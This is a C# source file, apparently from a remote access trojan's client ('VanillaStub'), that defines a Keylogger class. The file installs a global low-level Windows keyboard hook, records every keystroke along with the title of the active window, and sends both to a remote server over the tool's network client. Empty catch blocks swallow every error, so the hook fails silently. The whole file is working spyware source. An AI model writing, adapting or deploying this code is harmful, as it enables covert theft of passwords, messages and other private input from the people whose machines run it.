using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Text;
using System.Windows.Forms;

namespace VanillaStub.Helpers.Services
{
    public class Keylogger
    {
        public delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);

        private const int WH_KEYBOARD_LL = 13;
        private const int WM_KEYDOWN = 0x0100;
        private static readonly LowLevelKeyboardProc Proc = HookCallback;
        private static IntPtr HookID = IntPtr.Zero;
        private static string CurrentWindow = "";
        public static bool SendKeys { private get; set; }

        public void InitKeylogger()
        {
            try
            {
                ApplicationContext MessageLoop = new ApplicationContext();
                HookID = SetHook(Proc);
                Application.Run(MessageLoop);
                UnhookWindowsHookEx(HookID);
            }
            catch { }
        }

        public IntPtr SetHook(LowLevelKeyboardProc Proc)
        {
            using (Process CurrentProcess = Process.GetCurrentProcess())
            using (ProcessModule CurrentModule = CurrentProcess.MainModule)
            {
                return SetWindowsHookEx(WH_KEYBOARD_LL, Proc, GetModuleHandle(CurrentModule.ModuleName), 0);
            }
        }

        public static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam)
        {
            try
            {
                if (nCode >= 0 && wParam == (IntPtr) WM_KEYDOWN)
                {
                    int vkCode = Marshal.ReadInt32(lParam);
                    if (SendKeys)
                    {
                        List<byte> ToSend = new List<byte>();
                        ToSend.Add((int) DataType.KeystrokeType);
                        ToSend.AddRange(Encoding.ASCII.GetBytes(((Keys) vkCode).ToString()));
                        Networking.Networking.MainClient.Send(ToSend.ToArray());
                        ToSend.Clear();
                        CurrentWindow = GetWindowName();
                        ToSend.Add((int) DataType.CurrentWindowType);
                        ToSend.AddRange(Encoding.ASCII.GetBytes(CurrentWindow));
                        Networking.Networking.MainClient.Send(ToSend.ToArray());
                    }
                }
            }
            catch { }

            return CallNextHookEx(HookID, nCode, wParam, lParam);
        }

        public static string GetWindowName()
        {
            const int NChars = 256;
            StringBuilder Buff = new StringBuilder(NChars);
            IntPtr Handle = GetForegroundWindow();
            if (GetWindowText(Handle, Buff, NChars) > 0) return Buff.ToString();
            return "N/A";
        }

        [DllImport("user32.dll")]
        public static extern IntPtr GetForegroundWindow();

        [DllImport("user32.dll")]
        public static extern int GetWindowText(IntPtr hWnd, StringBuilder text, int count);

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        public static extern IntPtr SetWindowsHookEx(int idHook,
            LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        public static extern bool UnhookWindowsHookEx(IntPtr hhk);

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        public static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode,
            IntPtr wParam, IntPtr lParam);

        [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        public static extern IntPtr GetModuleHandle(string lpModuleName);
    }
}